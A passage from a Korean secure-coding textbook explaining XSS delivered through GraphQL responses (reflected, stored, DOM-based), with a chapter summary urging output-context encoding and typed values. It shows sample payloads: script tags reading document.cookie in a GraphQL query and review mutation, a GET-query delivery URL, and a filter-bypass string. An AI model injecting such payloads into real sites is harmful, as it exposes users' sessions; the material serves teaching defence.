이 메시지가 로그에 남고, 로그가 브라우저 기반 도구에서 이스케이프 없이 분석되면 스크립트가 실행된다. 값이 무해해 보이는 로그 컨텍스트에 들어갈 때는 데이터였다가, 로그 분석 도구라는 다른 컨텍스트로 들어가는 순간 코드가 된다. 이것이 3장의 컨텍스트 매핑과 의미 경계가 말하는 바다 — **데이터는 컨텍스트를 넘을 때 의미가 바뀐다.** 깨진 컨텍스트 맵 위에서, 데이터는 오로지 다른 컨텍스트로 들어갔다는 이유만으로 오해된다. 그래서 30.7의 처방은 단호하다. 확신이 없으면 반향하지 말라. 그리고 32.10의 처방은 그것의 일반형이다. **컨텍스트를 넘길 때는 반드시 도착 컨텍스트에 맞춰 값을 변환하라. 문자열이 아니라 타입으로 컨텍스트를 나르라.**

> **이 절이 뒷받침하는 것**
>
> - 문자열이 컨텍스트를 잃는 문제를 타입으로 해결 → **44.1** (도메인 프리미티브와 불변식), **44.2** (컨텍스트 경계가 의미를 정의한다)
> - 도메인 타입 라이브러리 구축과 노출 통제 → **44.3~44.4**
> - 입력을 그대로 반향하지 않는다는 설계 원칙 → **30.7** (입력을 절대 그대로 반향하지 말라)

## 32.11 GraphQL 응답을 경유한 XSS

인젝션 취약점이 클라이언트에 영향을 주는 방식은 API 기술이 바뀌어도 되풀이된다. GraphQL도 예외가 아니다. XSS의 관점에서 GraphQL은 REST와 근본적으로 다르지 않다 — 다만 진입점이 단일 엔드포인트의 질의·뮤테이션이라는 점이 다를 뿐이다.

**반사형.** GraphQL 질의가 클라이언트 입력을 받아 즉시 응답에 반영하고, 그 응답이 브라우저에서 HTML로 렌더링되면 반사형 XSS가 성립한다. 온라인 서점의 인사말 필드를 예로 들면:

```graphql
query {
  greeting(msg: "<script>document.cookie</script>")
}
```

`msg` 값이 페이지에 렌더링될 때 `<script>` 태그가 실행된다. 익스플로잇에는 피해자가 페이로드가 담긴 링크를 클릭하도록 하는 사회공학이 필요하다. 여기서 중요한 연결이 있다. GraphQL이 **GET 기반 질의**를 지원하면, 질의 전체를 URL에 담은 링크를 만들 수 있다:

```
https://books.example.com/graphql?query=query%7Bgreeting(msg%3A%22...%22)%7D
```

이렇게 되면 반사형 XSS의 전달 벡터(32.4)가 그대로 열리고, 동시에 GET 질의는 **33.6**이 다룰 GraphQL CSRF의 조건도 된다. 하나의 설계 결정(GET 허용)이 두 취약점의 문을 함께 여는 것이다.

**저장형.** GraphQL 뮤테이션으로 제출한 페이로드가 데이터스토어에 저장되었다가, 그 데이터를 읽는 페이지가 로드될 때마다 발화한다. 서점의 리뷰 작성 뮤테이션을 생각해 보자:

```graphql
mutation {
  createReview(bookId: "1", content: "<script>alert(document.cookie)</script>") {
    review { content }
  }
}
```

이 리뷰가 도서 페이지에 안전하지 않게 렌더링되면, 그 페이지를 보는 모든 사용자의 브라우저에서 스크립트가 실행된다. GraphQL 저장형 XSS는 특히 위험한 확산 경로를 가진다. **같은 데이터스토어를 읽는 인접 시스템**(캐시 DB, 관계형 DB, 로컬 파일, 다른 서버)이 모두 같은 익스플로잇의 영향을 받을 수 있기 때문이다. 저장된 페이로드가 렌더링되었다는 신호를 받지 못하는 **블라인드 XSS**도 흔하다 — 피드백 폼에 넣은 페이로드가 며칠 뒤 관리자가 그 폼을 열 때에야 발화하는 식이다.

**DOM 기반.** GraphQL API 자체는 DOM 기반 XSS의 근본 원인이 아니다. 이 취약점은 클라이언트 측 프런트엔드 코드에 있기 때문이다. 그러나 커뮤니티가 만든 GraphQL 클라이언트 라이브러리가 응답 데이터를 `eval`이나 `innerHTML` 같은 위험한 싱크로 흘려보내면 DOM 기반 XSS가 성립할 수 있다. GraphQL을 쓴다는 사실이 32.7의 소스·싱크 분석을 면제해 주지는 않는다.

GraphQL XSS가 주는 교훈은 이 부 전체의 논지와 같다. **프로토콜이 바뀌어도 실패의 유형은 반복된다.** 데이터와 구분자가 같은 채널을 공유하고(→ 27.1), 클라이언트 코드가 서버가 보낸 것을 신뢰하는 한(→ 5.9), XSS는 REST에서든 GraphQL에서든 똑같이 나타난다. 방어도 같다 — 출력 시점에 출력 컨텍스트에 맞춰 인코딩하고, 위험한 싱크를 피하며, 값을 문자열이 아니라 타입으로 다루는 것(→ 32.10).

## 이 장의 요약

- **XSS는 데이터와 구분자가 HTML 응답이라는 한 채널을 공유할 때 일어나는 인젝션이다.** 표적은 서버가 아니라 서버를 신뢰하는 다른 사용자이며, 브라우저가 공격자 스크립트를 취약한 도메인이 보낸 것으로 취급하기에 세션 토큰까지 넘어간다.
- **세 종류는 스크립트가 브라우저에 도달하는 경로로 나뉜다.** 반사형은 한 번의 요청·응답으로, 저장형은 저장 후 다른 사용자의 열람으로, DOM 기반은 서버를 거치지 않고 클라이언트 스크립트가 DOM 소스를 싱크로 흘려보내며 발생한다.
- **페이로드는 세션 하이재킹을 넘어선다.** 권한 있는 행위 유도, 트로이 목마 로그인 폼 주입, 자기 전파 웜이 모두 가능하며, `HttpOnly`는 쿠키 탈취만 막을 뿐 XSS 자체는 막지 못한다.
- **필터 우회의 본질은 하나다.** 필터는 세계에 대한 가정을 하고, 공격자는 브라우저가 그 가정 밖에서도 코드를 실행한다는 사실을 이용한다. 대소문자·NULL 바이트·인코딩·재귀 제거 우회(`<scr<script>ipt>`)·컨텍스트 이동이 모두 이 원리의 변주다.
- **"입력을 이스케이프한다"는 발상은 틀렸다.** 입력 시점에는 데이터가 어느 컨텍스트로 출력될지 알 수 없다. 이스케이프는 반드시 출력 시점에, 출력 컨텍스트(HTML 본문·속성·스크립트·스타일·URL)에 맞춰 수행해야 한다.
- **출력 인코딩이 필수이고 입력 검증은 보조 안전망이다.** 둘을 함께 두어 하나가 실패해도 다른 하나가 보호하게 한다. 정규화가 끝난 뒤 인코딩하고, 그 뒤에 다시 정규화하지 않는다.
- **문자열을 문자열로 다루면 컨텍스트를 잃는다.** 도메인 타입으로 다루면 타입이 컨텍스트를 기억한다 — 이것이 30.7의 "입력을 반향하지 말라"가 44장의 도메인 프리미티브로 이어지는 다리다.
- **프로토콜이 바뀌어도 실패는 반복된다.** GraphQL의 반사형·저장형·DOM 기반 XSS는 REST의 그것과 다르지 않으며, GET 기반 질의는 XSS 전달과 CSRF의 문을 함께 연다.

## 이어지는 장

XSS는 공격자가 피해자의 브라우저 안에서 **코드를 실행**하는 방법이었다. 그러나 공격자가 코드를 직접 실행하지 못하더라도, 피해자의 브라우저가 이미 가진 신뢰 — 로그인된 세션, 저장된 쿠키 — 를 빌려 피해자 **대신 요청을 보내게** 만들 수 있다. 32.3에서 "페이로드 스크립트가 사용자를 유도해 행위를 수행시킨다"고 했을 때 미뤄 둔 그 메커니즘을, 다음 장이 정면으로 다룬다.

**33장**은 요청 위조와 UI 사기를 다룬다. 크로스 사이트 요청 위조(CSRF)는 피해자의 브라우저가 자동으로 첨부하는 쿠키를 이용해 위조된 요청을 진짜처럼 보내게 하고, 클릭재킹은 피해자가 보는 화면과 실제로 클릭하는 대상을 어긋나게 만든다. GraphQL의 GET 기반 질의가 왜 CSRF의 조건이 되는지(→ 33.6), 그리고 XSS의 전달 벡터와 요청 위조가 어떻게 한 몸인지가 그곳에서 이어진다. XSS가 동일 출처 정책의 **안쪽**을 공격했다면, 다음 장부터는 그 경계선 자체를 두고 벌어지는 싸움으로 들어간다 — 그 판정의 정확한 규칙은 **34장**에서 해부한다.
